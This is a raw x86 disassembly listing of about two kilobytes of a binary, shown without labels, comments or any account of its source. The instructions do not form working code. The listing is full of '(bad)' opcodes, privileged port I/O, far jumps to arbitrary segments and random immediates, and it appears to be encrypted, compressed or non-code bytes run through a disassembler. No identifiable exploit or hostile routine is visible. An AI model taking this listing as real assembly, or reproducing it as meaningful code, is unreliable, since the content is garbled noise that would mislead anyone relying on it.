  4137db:	loop   0x413801
  4137dd:	clc    
  4137de:	inc    ebx
  4137df:	test   al,0x9f
  4137e1:	mov    al,0x41
  4137e3:	je     0x413813
  4137e5:	mov    es,ebp
  4137e7:	clc    
  4137e8:	mov    al,ds:0x5b7f0401
  4137ed:	into   
  4137ee:	add    BYTE PTR [esi],ch
  4137f0:	out    0x13,eax
  4137f2:	or     eax,0x6cbeda
  4137f7:	add    cl,dl
  4137f9:	sbb    bh,BYTE PTR [ecx-0x16]
  4137fc:	adc    dl,BYTE PTR [eax+eiz*1+0x2ff521a9]
  413803:	retf   
  413804:	xor    al,0xe3
  413806:	sub    DWORD PTR [ebx],esi
  413808:	into   
  413809:	inc    edx
  41380a:	nop
  41380b:	das    
  41380c:	ja     0x4137c2
  41380e:	mov    esi,cs
  413810:	inc    eax
  413811:	(bad)  
  413812:	call   0xbae1:0xc42e576e
  413819:	mov    ecx,0xecabb532
  41381e:	dec    ebx
  41381f:	mov    ch,0x7a
  413821:	out    dx,al
  413822:	fcmove st,st(1)
  413824:	xchg   ebp,eax
  413825:	jbe    0x4137b1
  413827:	test   BYTE PTR [edi],ah
  413829:	mov    ah,0x2c
  41382b:	lods   al,BYTE PTR ds:[esi]
  41382c:	mov    BYTE PTR [eax+0x272a57a8],ah
  413832:	add    dl,BYTE PTR [eax+0x3b]
  413835:	mov    ecx,esi
  413837:	xor    DWORD PTR ds:0x2aa17611,ebx
  41383d:	ja     0x413855
  41383f:	jne    0x413829
  413841:	into   
  413842:	(bad)  
  413843:	mov    edi,0x7c1ce6f
  413848:	push   ds
  413849:	fwait
  41384a:	inc    eax
  41384b:	out    dx,eax
  41384c:	fst    DWORD PTR [edi]
  41384e:	call   DWORD PTR [ecx+0x60]
  413851:	imul   edi,ebx,0x9012be1e
  413857:	cdq    
  413858:	imul   eax,DWORD PTR [edx+0x53987dda],0xffffff98
  41385f:	stos   BYTE PTR es:[edi],al
  413860:	sub    DWORD PTR [edx],ebx
  413862:	fcom   QWORD PTR [edi-0x7]
  413865:	repz retf 
  413867:	cmp    ch,bh
  413869:	jo     0x413803
  41386b:	mov    ds:0xe30ce06d,al
  413870:	aas    
  413871:	push   ebx
  413872:	xchg   edx,eax
  413873:	mov    WORD PTR [eax+0x280a6a3c],?
  413879:	aam    0x45
  41387b:	mov    ebp,0x61e03df2
  413880:	jmp    0x5ff8dfe3
  413885:	mov    ch,0x8
  413887:	aam    0xde
  413889:	push   esp
  41388a:	adc    dh,al
  41388c:	repnz mov ah,0x32
  41388f:	jmp    0xcfd5:0xbd219151
  413896:	mov    cl,0x9a
  413898:	inc    edx
  413899:	mov    edx,0xf23d71f4
  41389e:	(bad)  
  4138a0:	test   BYTE PTR [ecx+0x3e],dh
  4138a3:	fs dec eax
  4138a5:	add    al,0x59
  4138a7:	dec    esi
  4138a8:	and    eax,0x741c83dd
  4138ad:	sub    BYTE PTR [ecx-0x2f],al
  4138b0:	cmp    BYTE PTR [edx+eiz*2],0x31
  4138b4:	int    0xbb
  4138b6:	add    eax,0xa47ce633
  4138bb:	rcl    dl,cl
  4138bd:	fsub   QWORD PTR [esi-0x21da67a5]
  4138c3:	je     0x4138f4
  4138c5:	sub    ecx,DWORD PTR cs:[ebx+0x1981daf6]
  4138cc:	mov    cl,0xcf
  4138ce:	out    dx,eax
  4138cf:	sbb    BYTE PTR [ecx+0x38],dl
  4138d2:	mov    edi,0x7f66b19d
  4138d7:	shr    DWORD PTR [edi],cl
  4138d9:	adc    esp,edi
  4138db:	pop    edi
  4138dc:	adc    eax,0x96d01869
  4138e1:	(bad)  
  4138e2:	pop    edi
  4138e3:	pusha  
  4138e4:	mov    ebp,ss
  4138e6:	mul    BYTE PTR [edi+0x8]
  4138e9:	jae    0x41392d
  4138eb:	fidiv  WORD PTR [edx*2+0x75cce2ec]
  4138f2:	addr16 pop edi
  4138f4:	jne    0x413933
  4138f6:	pop    esi
  4138f7:	sbb    al,BYTE PTR [ebx+0x4e98204e]
  4138fd:	ja     0x4138f5
  4138ff:	cmp    al,0x4
  413901:	mov    bl,0x7d
  413903:	adc    edi,edi
  413905:	pop    es
  413906:	aam    0x8e
  413908:	push   esp
  413909:	jle    0x4138f5
  41390b:	xchg   BYTE PTR [esi+esi*8],al
  41390e:	mov    dl,0xb2
  413910:	pushf  
  413911:	mov    bl,BYTE PTR [ecx]
  413913:	ins    DWORD PTR es:[edi],dx
  413914:	cdq    
  413915:	jg     0x413969
  413917:	retf   
  413918:	adc    ch,bh
  41391a:	xlat   BYTE PTR ds:[ebx]
  41391b:	cmp    DWORD PTR [ecx-0x67],ebx
  41391e:	mov    dl,0xfb
  413920:	stc    
  413921:	leave  
  413922:	adc    BYTE PTR [edx-0x73],al
  413925:	inc    esp
  413926:	stos   BYTE PTR es:[edi],al
  413927:	and    eax,0x6efbc489
  41392c:	outs   dx,DWORD PTR ds:[esi]
  41392d:	rcr    BYTE PTR [ecx+0x42],cl
  413930:	xchg   DWORD PTR [eax+0x565d33e3],ecx
  413936:	jp     0x4138e5
  413938:	xor    al,0x88
  41393a:	xchg   ecx,eax
  41393b:	(bad)  
  41393c:	(bad)  
  41393d:	(bad)  
  41393f:	xchg   edx,eax
  413940:	and    eax,ecx
  413942:	fs cli 
  413944:	retf   0xf359
  413947:	mov    ah,0x8d
  413949:	jns    0x413931
  41394b:	inc    ebx
  41394c:	mov    ebx,0xaf4499e6
  413951:	std    
  413952:	test   al,0xfc
  413954:	sub    ebp,DWORD PTR [ecx-0x5c]
  413957:	daa    
  413958:	mov    al,0x55
  41395a:	mov    al,ds:0x4b4653e1
  41395f:	outs   dx,DWORD PTR ds:[esi]
  413960:	(bad)  
  413961:	mov    ds:0xa0884609,eax
  413966:	lods   al,BYTE PTR ds:[esi]
  413967:	call   0x75a0f20e
  41396c:	lods   al,BYTE PTR ds:[esi]
  41396d:	mov    edx,0xf4e87939
  413972:	popa   
  413973:	xor    al,0x77
  413975:	aas    
  413976:	fsubp  st(1),st
  413978:	lea    eax,ds:0x4bd06550
  41397e:	cdq    
  41397f:	gs in  eax,dx
  413981:	rcr    BYTE PTR [esi+esi*2],0x78
  413985:	xchg   ecx,eax
  413986:	inc    ebx
  413987:	mov    ebp,DWORD PTR [edi]
  413989:	fadd   st(6),st
  41398b:	cli    
  41398c:	jecxz  0x4139ca
  41398e:	mov    dh,0x46
  413990:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413991:	shr    BYTE PTR ds:0x2d9f3d19,1
  413997:	pop    esi
  413998:	js     0x413937
  41399a:	mov    eax,0x29970658
  41399f:	out    0x31,al
  4139a1:	sbb    DWORD PTR [ecx],eax
  4139a3:	push   cs
  4139a4:	data16 loopne 0x413a11
  4139a7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4139a8:	xor    eax,0xcb4f99d0
  4139ad:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4139ae:	pushf  
  4139af:	xchg   ecx,eax
  4139b0:	cwde   
  4139b1:	jecxz  0x413a24
  4139b3:	sub    BYTE PTR [ebx],ah
  4139b5:	out    0xa,al
  4139b7:	into   
  4139b8:	lahf   
  4139b9:	push   esp
  4139ba:	call   0x84feb970
  4139bf:	mov    BYTE PTR [esi-0x66],cl
  4139c2:	inc    esp
  4139c3:	and    al,0x4a
  4139c5:	xchg   ebx,eax
  4139c6:	xor    al,0xe4
  4139c8:	mov    esi,0x3e6e0e65
  4139cd:	test   eax,0x9e1d3967
  4139d2:	jl     0x413a53
  4139d4:	and    edx,DWORD PTR [eax-0x27]
  4139d7:	stc    
  4139d8:	ins    BYTE PTR es:[edi],dx
  4139d9:	stos   DWORD PTR es:[edi],eax
  4139da:	outs   dx,BYTE PTR ds:[esi]
  4139db:	adc    ch,ch
  4139dd:	mov    BYTE PTR [edx],dl
  4139df:	cdq    
  4139e0:	inc    eax
  4139e1:	xor    BYTE PTR [ebx],0x3f
  4139e4:	or     eax,0x37880576
  4139e9:	pop    edi
  4139ea:	adc    esi,DWORD PTR [ecx-0x62]
  4139ed:	mov    esi,0x8fb3afc8
  4139f2:	xchg   BYTE PTR [edx],bl
  4139f4:	imul   ebx,DWORD PTR [esi-0x30c80198],0x66
  4139fb:	call   0x19924c7f
  413a00:	mov    bl,BYTE PTR [edx-0x9]
  413a03:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413a04:	pop    esp
  413a05:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413a06:	mov    ebx,0x4bfbdde9
  413a0b:	dec    edi
  413a0c:	or     edx,DWORD PTR [ecx+0x11c15f6e]
  413a12:	and    DWORD PTR [edx],0xffffffed
  413a15:	adc    DWORD PTR [esi+esi*4-0x3b],0x1ac75c66
  413a1d:	in     al,0x14
  413a1f:	retf   
  413a20:	int    0xcf
  413a22:	aad    0xcc
  413a24:	mov    bh,0xf1
  413a26:	and    ecx,esp
  413a28:	adc    bh,BYTE PTR [ecx-0x2c]
  413a2b:	jae    0x413a18
  413a2d:	aaa    
  413a2e:	push   ebx
  413a2f:	jae    0x413a39
  413a31:	pop    ds
  413a32:	add    al,BYTE PTR gs:[ecx+0x1f]
  413a36:	(bad)  
  413a37:	mov    dl,0x13
  413a39:	(bad)  
  413a3a:	cld    
  413a3b:	out    dx,al
  413a3c:	or     cl,BYTE PTR [edi]
  413a3e:	jecxz  0x413a3b
  413a40:	arpl   si,ax
  413a42:	add    eax,0x63635b23
  413a47:	(bad)  
  413a48:	loope  0x413ab0
  413a4a:	fcomp  QWORD PTR [ebx+ebx*4]
  413a4d:	fistp  QWORD PTR [ebp+0xafe0246]
  413a53:	sub    DWORD PTR gs:[eax],ebx
  413a56:	add    DWORD PTR [bp+di+0x7b18],ecx
  413a5b:	and    ch,BYTE PTR [ebp+0x39]
  413a5e:	pop    ebx
  413a5f:	ret    0x4350
  413a62:	call   0x80901286
  413a67:	sub    ch,BYTE PTR [esi+0x1e]
  413a6a:	jnp    0x413a3e
  413a6c:	sbb    ah,BYTE PTR [edi]
  413a6e:	ins    BYTE PTR es:[edi],dx
  413a6f:	out    0x5c,al
  413a71:	leave  
  413a72:	add    edx,DWORD PTR [ebx+0x5b61ee07]
  413a78:	pusha  
  413a79:	jbe    0x413a67
  413a7b:	pop    es
  413a7c:	sub    eax,0x80f024d0
  413a81:	adc    DWORD PTR [esi],esp
  413a83:	xchg   ebp,eax
  413a84:	dec    ecx
  413a85:	idiv   BYTE PTR [eax]
  413a87:	and    BYTE PTR [esp+edx*8-0x2e3cc188],al
  413a8e:	mov    ds:0x17949586,eax
  413a93:	sbb    eax,0xea69100d
  413a98:	jmp    0x7888a2f2
  413a9d:	(bad)  
  413a9e:	mov    edx,0x1aa08735
  413aa3:	pushf  
  413aa4:	jbe    0x413ac2
  413aa6:	fdivr  st(0),st
  413aa8:	push   es
  413aa9:	daa    
  413aaa:	mov    BYTE PTR [edi-0x78],0x43
  413aae:	cmp    bh,ah
  413ab0:	enter  0x6382,0x47
  413ab4:	dec    ecx
  413ab5:	or     eax,0x6a3cd369
  413aba:	stc    
  413abb:	pop    ds
  413abc:	pop    esp
  413abd:	jp     0x413b11
  413abf:	(bad)  
  413ac0:	push   ds
  413ac1:	imul   esp,DWORD PTR [edx-0x12],0xc805c3b8
  413ac8:	es fadd QWORD PTR fs:[edx+0x484083f3]
  413ad0:	adc    eax,DWORD PTR [ecx-0x19235c72]
  413ad6:	mov    WORD PTR [edx],?
  413ad8:	fmul   DWORD PTR ds:0xd40326e7
  413ade:	dec    DWORD PTR [esi-0x1c808e94]
  413ae4:	popf   
  413ae5:	jmp    0x7b49bd60
  413aea:	inc    esp
  413aeb:	inc    ecx
  413aec:	mov    cl,0xdf
  413aee:	sub    BYTE PTR ds:0xd2c6630a,ch
  413af4:	aam    0x50
  413af6:	jecxz  0x413ab0
  413af8:	xchg   esi,eax
  413af9:	les    edx,FWORD PTR [esi+0x6578ba95]
  413aff:	retf   0x8078
  413b02:	std    
  413b03:	xchg   edx,eax
  413b04:	dec    eax
  413b05:	jmp    0x8e8f:0xdf0038eb
  413b0c:	in     al,dx
  413b0d:	in     eax,0x19
  413b0f:	enter  0xec1f,0xf
  413b13:	inc    ebx
  413b14:	sbb    dl,BYTE PTR [ebx-0x6]
  413b17:	xchg   edi,eax
  413b18:	neg    DWORD PTR [edi-0x41e325d8]
  413b1e:	fsubr  QWORD PTR [ebp-0x22]
  413b21:	or     eax,eax
  413b23:	rol    DWORD PTR [edi+0x6ca220bf],1
  413b29:	push   edx
  413b2a:	stos   BYTE PTR es:[edi],al
  413b2b:	and    al,0xb4
  413b2d:	xchg   ebx,eax
  413b2e:	mov    ?,WORD PTR [esi]
  413b30:	xor    DWORD PTR [ebx],esi
  413b32:	pop    esp
  413b33:	ffreep st(4)
  413b35:	dec    eax
  413b36:	stos   DWORD PTR es:[edi],eax
  413b37:	mov    al,ds:0x503ebac8
  413b3c:	sbb    al,0x18
  413b3e:	push   esi
  413b3f:	cmp    BYTE PTR [ecx],al
  413b41:	dec    esi
  413b42:	je     0x413ba8
  413b44:	cmp    al,ah
  413b46:	dec    edi
  413b47:	addr16 iret 
  413b49:	mov    ch,0x6e
  413b4b:	add    eax,0xb0140d07
  413b50:	cmp    dl,ah
  413b52:	jl     0x413bb1
  413b54:	jmp    FWORD PTR [ecx+esi*8-0x6d]
  413b58:	push   0x4e359f3c
  413b5d:	cmp    ch,0x42
  413b60:	sbb    eax,0xdb0cc47f
  413b65:	in     eax,dx
  413b66:	bnd js 0x413ba7
  413b69:	in     eax,0xd4
  413b6b:	(bad)  
  413b6c:	jle    0x413b9b
  413b6e:	mov    al,ds:0xfc0fee07
  413b73:	adc    eax,DWORD PTR [eax]
  413b75:	jae    0x413b8c
  413b77:	neg    edx
  413b79:	shr    BYTE PTR [eax+0x1f],1
  413b7c:	or     eax,0x1af9715c
  413b81:	mov    ebx,0x62b69fec
  413b86:	out    dx,al
  413b87:	cdq    
  413b88:	jge    0x413b62
  413b8a:	mov    bl,0xa1
  413b8c:	and    eax,ecx
  413b8e:	mov    esp,edi
  413b90:	fstp   DWORD PTR [esi*2-0xd70b18a]
  413b97:	mov    ah,0xb5
  413b99:	ss in  eax,dx
  413b9b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413b9c:	sbb    al,0xce
  413b9e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413b9f:	in     al,0xb7
  413ba1:	ins    BYTE PTR es:[edi],dx
  413ba2:	xor    ecx,DWORD PTR [ebx+0x4]
  413ba5:	pushf  
  413ba6:	and    eax,0xe8f174ba
  413bab:	(bad)  
  413bac:	data16 fdiv QWORD PTR [edx]
  413baf:	mov    cl,0x8a
  413bb1:	push   ebp
  413bb2:	jno    0x413c0c
  413bb4:	loope  0x413c30
  413bb6:	mov    ds:0xcaa37179,al
  413bbb:	push   edx
  413bbc:	scas   eax,DWORD PTR es:[edi]
  413bbd:	dec    esi
  413bbe:	or     bl,BYTE PTR [esi-0x2688907e]
  413bc4:	shl    BYTE PTR [ecx],cl
  413bc6:	rcl    ecx,1
  413bc8:	xor    eax,0x6800b833
  413bcd:	jle    0x413c4e
  413bcf:	and    BYTE PTR [esi-0x19c6b275],dl
  413bd5:	jge    0x413c40
  413bd7:	lds    esp,FWORD PTR [edx+0x10]
  413bda:	retf   
  413bdb:	mov    ecx,0x1f87d103
  413be0:	mov    esp,0x5feabe57
  413be5:	je     0x413b9d
  413be7:	sti    
  413be8:	cmp    al,0x75
  413bea:	jns    0x413c22
  413bec:	addr16 mov cl,dh
  413bef:	ins    DWORD PTR es:[edi],dx
  413bf0:	xchg   BYTE PTR [esi-0x69],dl
  413bf3:	dec    eax
  413bf4:	sub    al,0x9a
  413bf6:	in     eax,dx
  413bf7:	das    
  413bf8:	xor    al,0xfe
  413bfa:	cmp    eax,0x96523bef
  413bff:	leave  
  413c00:	lods   al,BYTE PTR ds:[esi]
  413c01:	xchg   ecx,eax
  413c02:	cs cmc 
  413c04:	mov    eax,0x12a404e1
  413c09:	test   al,0x7a
  413c0b:	loop   0x413c41
  413c0d:	retf   
  413c0e:	into   
  413c0f:	add    ch,BYTE PTR [ebp-0x34950a5d]
  413c15:	sub    al,0xa3
  413c17:	les    ecx,FWORD PTR [edx]
  413c19:	loopne 0x413c4c
  413c1b:	xchg   ecx,eax
  413c1c:	pop    ebp
  413c1d:	mov    BYTE PTR [ebp-0xc4fe39e],dh
  413c23:	xchg   ebx,eax
  413c24:	outs   dx,DWORD PTR ds:[esi]
  413c25:	aaa    
  413c26:	push   ecx
  413c27:	jno    0x413bec
  413c29:	pop    ds
  413c2a:	pop    ebx
  413c2b:	cli    
  413c2c:	sbb    BYTE PTR [ebp+0x5ab0f8c6],bh
  413c32:	icebp  
  413c33:	pop    esp
  413c34:	fldcw  WORD PTR [esp+eax*4+0xe]
  413c38:	or     DWORD PTR [esp+ecx*1-0x48],ebx
  413c3c:	clc    
  413c3d:	outs   dx,DWORD PTR ds:[esi]
  413c3e:	mov    al,ds:0x29af2902
  413c43:	dec    ebx
  413c44:	xlat   BYTE PTR ds:[ebx]
  413c45:	loope  0x413bde
  413c47:	dec    edi
  413c48:	es and eax,0x8e9bb735
  413c4e:	fsub   DWORD PTR ds:0xd8faf28d
  413c54:	loop   0x413c01
  413c56:	(bad)  
  413c57:	aam    0x59
  413c59:	cmp    al,0x76
  413c5b:	mov    dl,BYTE PTR [ebx+0x33]
  413c5e:	test   DWORD PTR [edx+0x4d],0xe700bb
  413c65:	test   DWORD PTR [esp+edi*4],esp
  413c68:	stc    
  413c69:	cld    
  413c6a:	xchg   ebp,eax
  413c6b:	les    ebp,FWORD PTR [ecx+0x7c7f5be9]
  413c71:	(bad)  [edi]
  413c73:	fisttp WORD PTR [ecx-0x3d3b13ee]
  413c79:	cli    
  413c7a:	xor    ch,BYTE PTR [ecx]
  413c7c:	jo     0x413c40
  413c7e:	rcr    BYTE PTR [ecx],cl
  413c80:	ror    DWORD PTR [ecx-0x15db531b],cl
  413c86:	xor    BYTE PTR [edx+0x14],cl
  413c89:	push   esp
  413c8a:	adc    bh,BYTE PTR [ebx-0x17e8bb27]
  413c90:	ins    BYTE PTR es:[edi],dx
  413c91:	mov    cl,bh
  413c93:	jmp    0x3da9:0xa8196b33
  413c9a:	dec    ebx
  413c9b:	pop    esp
  413c9c:	sub    al,0xb
  413c9e:	sbb    al,0x96
  413ca0:	data16 ins BYTE PTR es:[edi],dx
  413ca2:	cmc    
  413ca3:	mov    bl,0x48
  413ca5:	shr    DWORD PTR [eax],cl
  413ca7:	mov    esi,0xa7448c28
  413cac:	clc    
  413cad:	add    ecx,DWORD PTR [edi-0x9]
  413cb0:	sbb    DWORD PTR [ebp-0x34f32c37],esp
  413cb6:	nop
  413cb7:	adc    edx,ebx
  413cb9:	or     esp,DWORD PTR [edx]
  413cbb:	mov    ch,0xf9
  413cbd:	cld    
  413cbe:	jbe    0x413d26
  413cc0:	and    bl,BYTE PTR [ebx+0x5f]
  413cc3:	dec    edi
  413cc4:	dec    ebp
  413cc5:	stos   BYTE PTR es:[edi],al
  413cc6:	xchg   ebp,eax
  413cc7:	out    0x75,eax
  413cc9:	pop    es
  413cca:	pop    ebp
  413ccb:	dec    eax
  413ccc:	xor    ebp,edx
  413cce:	in     al,0x4
  413cd0:	xchg   edx,eax
  413cd1:	stc    
  413cd2:	in     eax,0x96
  413cd4:	or     BYTE PTR ds:0x3014d4d,ch
  413cda:	ficomp WORD PTR [eax+eiz*1+0x2d38e60]
  413ce1:	test   eax,0xdeee6377
  413ce6:	rol    DWORD PTR [ebx+edi*1+0x2b],0x75
  413ceb:	(bad)  
  413cec:	jae    0x413d64
  413cee:	or     eax,0xd5637c6c
  413cf3:	test   BYTE PTR [ecx-0x7727e92c],bl
  413cf9:	sbb    ch,BYTE PTR [edx]
  413cfb:	mov    ch,0xa7
  413cfd:	dec    ebx
  413cfe:	mov    ds:0x71518e9d,al
  413d03:	test   BYTE PTR ds:0x115ca5df,cl
  413d09:	inc    BYTE PTR [ebx]
  413d0b:	sbb    esp,ebp
  413d0d:	xlat   BYTE PTR ds:[ebx]
  413d0e:	in     al,dx
  413d0f:	xor    dh,BYTE PTR [edx]
  413d11:	or     DWORD PTR [ebx+0x137e814a],ecx
  413d17:	sub    BYTE PTR [eax],ch
  413d19:	fidivr DWORD PTR [edx]
  413d1b:	sbb    edi,ebp
  413d1d:	xlat   BYTE PTR ds:[ebx]
  413d1e:	and    DWORD PTR [ebx+0x26942ab],0x68
  413d25:	and    BYTE PTR [esi+0x619694b6],cl
  413d2b:	pop    eax
  413d2c:	sub    dh,ch
  413d2e:	and    eax,0x1e8a0d96
  413d33:	mul    BYTE PTR [eax-0x42]
  413d36:	ficomp WORD PTR [edx-0x437e793f]
  413d3d:	ficomp DWORD PTR [ebx-0x5f1ed9a1]
  413d43:	adc    dl,BYTE PTR [edx]
  413d45:	cmp    ebx,edx
  413d47:	sahf   
  413d48:	loopne 0x413dac
  413d4a:	loopne 0x413ce9
  413d4c:	or     eax,0x8fe9b161
  413d51:	dec    edi
  413d52:	shl    DWORD PTR [esp+edi*2],1
  413d55:	cmp    eax,DWORD PTR [edi]
  413d57:	mov    esp,gs
  413d59:	mov    edi,0xb1a31b87
  413d5e:	lahf   
  413d5f:	push   0x22cc4597
  413d64:	add    eax,0xf5ae1ec
  413d69:	das    
  413d6a:	call   0x99db:0x840283b5
  413d71:	xchg   ecx,eax
  413d72:	popa   
  413d73:	pop    eax
  413d74:	repnz add al,0x28
  413d77:	mov    eax,ds:0xc9d05888
  413d7c:	dec    esp
  413d7d:	push   ecx
  413d7e:	pop    ecx
  413d7f:	stos   DWORD PTR es:[edi],eax
  413d80:	lds    eax,FWORD PTR [ecx-0xd66b0d7]
  413d86:	leave  
  413d87:	dec    ebx
  413d88:	xor    al,0x5e
  413d8a:	jg     0x413d61
  413d8c:	jns    0x413e00
  413d8e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413d8f:	sub    BYTE PTR [edx+0x33],ch
  413d92:	jns    0x413d71
  413d94:	in     eax,dx
  413d95:	jle    0x413d81
  413d97:	dec    ebp
  413d98:	cs mov ebp,0x9db659e
  413d9e:	jle    0x413db5
  413da0:	mov    DWORD PTR [ebx+0x27],edi
  413da3:	adc    BYTE PTR [ecx],ah
  413da5:	sbb    al,0x40
  413da7:	cmc    
  413da8:	(bad)  
  413da9:	(bad)  
  413daa:	out    dx,al
  413dab:	pop    ds
  413dac:	jno    0x413dda
  413dae:	sahf   
  413daf:	fst    QWORD PTR [esp+ecx*2+0x26ae71ca]
  413db6:	sub    DWORD PTR [esi],0x61
  413db9:	and    al,0x21
  413dbb:	sub    DWORD PTR [ebx+0x71c0cb47],edx
  413dc1:	cmp    al,0x67
  413dc3:	sbb    dh,bl
  413dc5:	push   0x885b8d40
  413dca:	test   BYTE PTR [ebp-0x614081f3],0xe3
  413dd1:	xchg   esi,esi
  413dd3:	das    
  413dd4:	daa    
  413dd5:	ds fwait
  413dd7:	loope  0x413d5c
  413dd9:	loope  0x413e4b
  413ddb:	pop    ss
  413ddc:	inc    esi
  413ddd:	xor    BYTE PTR [edi],dh
  413ddf:	(bad)  
  413de0:	mov    ah,0x51
  413de2:	or     bl,BYTE PTR [eax]
  413de4:	xchg   ebx,eax
  413de5:	clc    
  413de6:	adc    DWORD PTR [ebp-0x20],0x5d
  413dea:	jae    0x413d6c
  413dec:	sub    eax,0x5a6aebee
  413df1:	pop    edx
  413df2:	lds    esi,FWORD PTR [ebp+esi*1+0x5aa75f51]
  413df9:	inc    ebp
  413dfa:	add    eax,0xb15a36c6
  413dff:	mov    esi,0xdce2859d
  413e04:	imul   esi,eax,0x39ecf384
  413e0a:	jg     0x413df7
  413e0c:	jl     0x413df5
  413e0e:	mov    cl,BYTE PTR [eax-0x52a44eb4]
  413e14:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413e15:	fsubr  st,st(4)
  413e17:	test   bh,cl
  413e19:	xchg   esi,eax
  413e1a:	cmp    DWORD PTR [edi-0x2c],esp
  413e1d:	sbb    bl,BYTE PTR [ebx-0x6d72fed9]
  413e23:	or     eax,0xf1128a3e
  413e28:	outs   dx,BYTE PTR ds:[esi]
  413e29:	xor    ch,BYTE PTR [ebx+0x5d]
  413e2c:	fwait
  413e2d:	inc    edx
  413e2e:	push   cs
  413e2f:	call   0xbcffd363
  413e34:	inc    esi
  413e35:	out    0x62,eax
  413e37:	loope  0x413ea0
  413e39:	push   0x81074f2
  413e3e:	dec    edi
  413e3f:	popf   
  413e40:	mov    cl,0x85
  413e42:	mov    BYTE PTR [ebx],ch
  413e44:	stos   BYTE PTR es:[edi],al
  413e45:	jl     0x413de0
  413e47:	inc    edx
  413e48:	jno    0x413ddb
  413e4a:	aam    0x74
  413e4c:	int3   
  413e4d:	or     eax,0x5c9c63bc
  413e52:	repz sub DWORD PTR [eax+eiz*4],ecx
  413e56:	adc    al,BYTE PTR [edx]
  413e58:	mov    edx,0x793842e6
  413e5d:	pop    ebx
  413e5e:	retf   
  413e5f:	ins    BYTE PTR es:[edi],dx
  413e60:	mov    ?,edi
  413e62:	xchg   edi,eax
  413e63:	je     0x413e1a
  413e65:	mov    edi,0x6fea2b21
  413e6a:	imul   ecx,DWORD PTR [esi],0x38
  413e6d:	xor    eax,0xee653758
  413e72:	push   eax
  413e73:	nop
  413e74:	or     dh,BYTE PTR [edx+0x1f]
  413e77:	or     al,0x80
  413e7a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413e7b:	cmp    dl,BYTE PTR [ebx-0x3598c4ac]
  413e81:	dec    ebx
  413e82:	jmp    0x35f5:0x36e3edbc
  413e89:	sar    cl,cl
  413e8b:	xor    edx,DWORD PTR [ebp+0x45]
  413e8e:	pop    edi
  413e8f:	dec    ebx
  413e90:	xor    al,ch
  413e92:	loopne 0x413e69
  413e94:	jnp    0x413e8f
  413e96:	xor    BYTE PTR [edx+ecx*8+0x7dc4d5c9],dh
  413e9d:	sbb    eax,0xef907fbf
  413ea2:	jl     0x413e88
  413ea4:	sub    DWORD PTR [edi+0x38f3e0ba],edx
  413eaa:	and    al,0xf4
  413eac:	xlat   BYTE PTR ds:[ebx]
  413ead:	pop    esi
  413eae:	pop    esp
  413eaf:	jae    0x413ef5
  413eb1:	imul   edi,DWORD PTR [ebp-0x385327],0xb2a09c24
  413ebb:	add    eax,0xfbfe0bd5
  413ec0:	pop    eax
  413ec1:	mov    eax,0x39fe90de
  413ec6:	pop    esi
  413ec7:	xor    ah,dl
  413ec9:	lods   eax,DWORD PTR es:[esi]
  413ecb:	dec    edi
  413ecc:	imul   edx,ebx,0x2583319
  413ed2:	addr16 and eax,0xf39cdec9
  413ed8:	xor    ah,BYTE PTR ds:0x6a665720
  413ede:	loope  0x413eb7
  413ee0:	(bad)  
  413ee1:	cmp    dl,BYTE PTR [ebp-0x65]
  413ee4:	es and ch,0x67
  413ee8:	add    esp,DWORD PTR [edi-0x48]
  413eeb:	les    edx,FWORD PTR [edx+0x6a202154]
  413ef1:	xchg   esi,eax
  413ef2:	ret    
  413ef3:	stos   DWORD PTR es:[edi],eax
  413ef4:	inc    ebx
  413ef5:	or     DWORD PTR [eax+0x54],ebp
  413ef8:	scas   al,BYTE PTR es:[edi]
  413ef9:	add    ah,BYTE PTR [ecx+0x76d5e366]
  413eff:	ins    DWORD PTR es:[edi],dx
  413f00:	push   esi
  413f01:	cld    
  413f02:	neg    BYTE PTR ds:0xc8bebbcb
  413f08:	adc    BYTE PTR ds:0x938da3e5,bh
  413f0e:	mov    ds:0xb2f216a1,al
  413f13:	mov    al,0x3f
  413f15:	sub    ah,0x4d
  413f18:	mov    al,ds:0x38c2d877
  413f1d:	enter  0x435c,0x6e
  413f21:	add    ch,BYTE PTR [edi-0x34]
  413f24:	fisttp DWORD PTR [esi+0x28]
  413f27:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413f28:	int3   
  413f29:	scas   al,BYTE PTR es:[edi]
  413f2a:	push   edx
  413f2b:	aas    
  413f2c:	add    eax,0xc05f4a81
  413f31:	inc    ebp
  413f32:	mov    ah,0x59
  413f34:	das    
  413f35:	lods   al,BYTE PTR ds:[esi]
  413f36:	sbb    DWORD PTR [esi],0xffffffe4
  413f39:	dec    edx
  413f3a:	push   eax
  413f3b:	rcl    BYTE PTR [eax+edx*1+0x17],cl
  413f3f:	mov    bh,0x15
  413f41:	and    al,0x91
  413f43:	ja     0x413ef0
  413f45:	(bad)  
  413f46:	sti    
  413f47:	mov    edx,0x2b78dab8
  413f4c:	jo     0x413f14
  413f4e:	dec    esi
  413f4f:	fs out dx,al
  413f51:	idiv   edi
  413f53:	fild   DWORD PTR [ebp+0x347f916e]
  413f59:	adc    ah,bh
  413f5b:	retf   
  413f5c:	pop    ds
  413f5d:	or     BYTE PTR [eax-0xf427203],0xf4
  413f64:	sbb    DWORD PTR [edi+0x45],esi
  413f67:	xor    dh,BYTE PTR [ebp+0x7b16cdab]
  413f6d:	or     al,0x7
  413f6f:	repz int 0xc3
  413f72:	mov    bl,0x2
  413f74:	mov    ah,0xe2
  413f76:	or     al,0xe5
  413f78:	arpl   cx,bx
  413f7a:	clc    
  413f7b:	push   ebp
  413f7c:	das    
  413f7d:	or     cl,BYTE PTR [esp+ebx*1]
  413f80:	loopne 0x413f06
  413f82:	add    al,0xae
  413f84:	mov    edi,0x5508a410
  413f89:	hlt    
  413f8a:	or     DWORD PTR [eax+0x4a],eax
  413f8d:	test   al,0x15
  413f8f:	mov    cl,0x6b
  413f91:	inc    edi
  413f92:	add    bl,dl
  413f94:	lock das 
  413f96:	fisttp QWORD PTR ds:0x22e295fa
